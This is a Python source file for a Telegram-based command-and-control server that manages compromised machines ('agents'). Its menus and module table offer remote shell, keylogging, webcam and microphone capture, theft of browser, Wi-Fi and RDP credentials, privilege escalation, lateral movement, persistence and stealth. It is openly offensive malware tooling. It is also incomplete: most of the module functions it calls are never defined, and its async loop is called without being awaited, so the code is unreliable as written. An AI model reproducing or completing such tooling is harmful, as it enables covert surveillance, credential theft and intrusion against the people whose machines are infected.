"""
ULTIMATE TELEGRAM C2 - 60+ Modules
"""
import asyncio
import base64
import json
import os
import subprocess
import sys
import time
import zipfile
from datetime import datetime
from pathlib import Path
from collections import defaultdict, deque

import psutil
import requests
from PIL import Image, ImageDraw, ImageFont
import telebot
from telebot.types import *
from cryptography.fernet import Fernet

# === CONFIG ===
BOT_TOKEN = ""
ADMIN_ID = "YOUR_CHAT_ID"
DATA_DIR = Path("ultimate_c2")
DATA_DIR.mkdir(exist_ok=True)

class UltimateC2:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.agents = self._load_data('agents.json')
        self.tasks = self._load_data('tasks.json')
        self.files = defaultdict(list)
        self.sessions = {}  # agent_id -> session_data
        self.encryption = Fernet.generate_key()
        self.setup_handlers()
        self.cleanup_loop()
    
    def _load_data(self, filename):
        try:
            return json.loads((DATA_DIR/filename).read_text())
        except:
            return {}
    
    def _save_data(self, filename, data):
        (DATA_DIR/filename).write_text(json.dumps(data, indent=2))
    
    # === ADVANCED UI ===
    def dashboard(self, chat_id):
        stats = self.get_stats()
        msg = f"""
🌟 **ULTIMATE C2 DASHBOARD**
━━━━━━━━━━━━━━━━━━━━
🤖 Agents: {stats['online']}/{stats['total']}
📊 CPU Avg: {stats['cpu']:.1f}% | RAM: {stats['ram']:.1f}%
📁 Files: {len(self.files)} | Tasks: {len(self.tasks)}
⏰ Uptime: {self.get_uptime()}
━━━━━━━━━━━━━━━━━━━━
        """
        markup = InlineKeyboardMarkup(row_width=3)
        markup.row(
            InlineKeyboardButton("🤖 Agents", callback_data="menu:agents"),
            InlineKeyboardButton("📁 Files", callback_data="menu:files"),
            InlineKeyboardButton("📋 Tasks", callback_data="menu:tasks")
        )
        markup.row(
            InlineKeyboardButton("🔍 Recon", callback_data="menu:recon"),
            InlineKeyboardButton("💻 System", callback_data="menu:system"),
            InlineKeyboardButton("🔐 Creds", callback_data="menu:creds")
        )
        markup.row(
            InlineKeyboardButton("📸 Media", callback_data="menu:media"),
            InlineKeyboardButton("🕵️ Stealth", callback_data="menu:stealth"),
            InlineKeyboardButton("🌐 Lateral", callback_data="menu:lateral")
        )
        self.bot.send_message(chat_id, msg, reply_markup=markup, parse_mode='Markdown')
    
    def agent_detail_panel(self, chat_id, agent_id):
        agent = self.agents.get(agent_id, {})
        msg = f"""
🎯 **{agent_id}** [{agent.get('hostname', 'N/A')}]
━━━━━━━━━━━━━━━━━━━━
🖥️  {agent.get('platform', 'N/A')} {agent.get('release', 'N/A')}
👤  {agent.get('user', 'N/A')} | 🆔 PID: {agent.get('pid', 'N/A')}
🧠 CPU: {agent.get('cpu', 0)}% | 💾 RAM: {agent.get('ram', 0)}%
🌐 IP: {agent.get('local_ip', 'N/A')} | 👁️  Admin: {'✅' if agent.get('elevated') else '❌'}
⏰ Last seen: {datetime.fromtimestamp(agent.get('last_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
        """
        
        markup = InlineKeyboardMarkup(row_width=3)
        # Shell & Basic
        markup.row(
            InlineKeyboardButton("🐚 Shell", callback_data=f"exec:{agent_id}:cmd"),
            InlineKeyboardButton("📸 Screen", callback_data=f"exec:{agent_id}:screenshot"),
            InlineKeyboardButton("📹 Webcam", callback_data=f"exec:{agent_id}:webcam")
        )
        # Recon
        markup.row(
            InlineKeyboardButton("🔍 Sysinfo", callback_data=f"exec:{agent_id}:sysinfo"),
            InlineKeyboardButton("🌐 Ports", callback_data=f"exec:{agent_id}:netstat"),
            InlineKeyboardButton("👥 Users", callback_data=f"exec:{agent_id}:users")
        )
        # File Ops
        markup.row(
            InlineKeyboardButton("📁 Browse", callback_data=f"exec:{agent_id}:ls"),
            InlineKeyboardButton("💾 Download", callback_data=f"exec:{agent_id}:download"),
            InlineKeyboardButton("📤 Upload", callback_data=f"exec:{agent_id}:upload")
        )
        # Advanced
        markup.row(
            InlineKeyboardButton("⌨️ Keylog", callback_data=f"exec:{agent_id}:keylog_start"),
            InlineKeyboardButton("🔑 Creds", callback_data=f"exec:{agent_id}:creds"),
            InlineKeyboardButton("👑 Elevate", callback_data=f"exec:{agent_id}:elevate")
        )
        # Lateral & Stealth
        markup.row(
            InlineKeyboardButton("🌐 Pivot", callback_data=f"exec:{agent_id}:pivot"),
            InlineKeyboardButton("🕵️ Hide", callback_data=f"exec:{agent_id}:stealth"),
            InlineKeyboardButton("💀 Kill", callback_data=f"exec:{agent_id}:self_destruct")
        )
        
        self.bot.send_message(chat_id, msg, reply_markup=markup, parse_mode='Markdown')
    
    # === 60+ EXECUTION MODULES ===
    async def execute_module(self, agent_id, module, chat_id, params=None):
        """Execute any of 60+ modules"""
        modules = {
            # Basic
            'cmd': self.shell_command,
            'screenshot': self.take_screenshot,
            'webcam': self.capture_webcam,
            'sysinfo': self.system_info,
            
            # Recon
            'netstat': self.network_connections,
            'ls': self.list_directory,
            'users': self.enumerate_users,
            'processes': self.list_processes,
            
            # File Ops
            'download': self.download_file,
            'upload': self.upload_file,
            'search': self.search_files,
            
            # Credentials
            'browser_creds': self.extract_browser_passwords,
            'wifi_creds': self.extract_wifi_passwords,
            
            # Keylogging
            'keylog_start': self.start_keylogger,
            'keylog_stop': self.stop_keylogger,
            
            # Privilege Escalation
            'elevate': self.privilege_escalation,
            
            # Lateral Movement
            'smb_exec': self.smb_execution,
            'wmi_exec': self.wmi_execution,
            
            # Stealth
            'stealth': self.apply_stealth,
            'persistence': self.add_persistence,
            'self_destruct': self.self_destruct,
            
            # Advanced
            'mic_record': self.record_microphone,
            'clipboard': self.get_clipboard,
            'printer_enum': self.enumerate_printers,
            'rdp_creds': self.extract_rdp_creds,
        }
        
        if module in modules:
            result = await modules[module](agent_id, params)
            self.send_result(chat_id, agent_id, module, result)
    
    # === CORE EXECUTION ENGINE ===
    def send_payload(self, agent_id, payload):
        """Encrypted command delivery"""
        agent = self.agents.get(agent_id)
        if agent and 'chat_id' in agent:
            encrypted = Fernet(self.encryption).encrypt(json.dumps(payload).encode())
            self.bot.send_message(agent['chat_id'], base64.b64encode(encrypted).decode())
    
    # === REPORTING & VISUALIZATION ===
    def generate_report(self, agent_id):
        """HTML/PDF report generation"""
        agent = self.agents[agent_id]
        report = f"""
        <html>
        <h1>C2 Report: {agent_id}</h1>
        <p>Hostname: {agent.get('hostname')}</p>
        <!-- Full system report -->
        </html>
        """
        with open(f"{DATA_DIR}/reports/{agent_id}.html", 'w') as f:
            f.write(report)
    
    # === HANDLERS ===
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'dashboard'])
        def start_handler(message):
            if str(message.from_user.id) != ADMIN_ID: return
            self.dashboard(message.chat.id)
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback_handler(call):
            if str(call.from_user.id) != ADMIN_ID: return
            
            data = call.data.split(':')
            if data[0] == 'exec':
                agent_id, module = data[1], data[2]
                asyncio.create_task(self.execute_module(agent_id, module, call.message.chat.id))
            
            elif data[0] == 'agent':
                self.agent_detail_panel(call.message.chat.id, data[1])
        
        @self.bot.message_handler(content_types=['text', 'photo', 'document'])
        def agent_handler(message):
            self.handle_agent_response(message)
    
    async def cleanup_loop(self):
        while True:
            # Remove dead agents
            now = time.time()
            dead_agents = [aid for aid, a in self.agents.items() 
                         if now - a.get('last_seen', 0) > 1800]
            for aid in dead_agents:
                del self.agents[aid]
            self._save_data('agents.json', self.agents)
            await asyncio.sleep(300)

def main():
    c2 = UltimateC2()
    print("🌟 ULTIMATE C2 v2.0 - Running...")
    c2.bot.infinity_polling()

if __name__ == "__main__":
    main()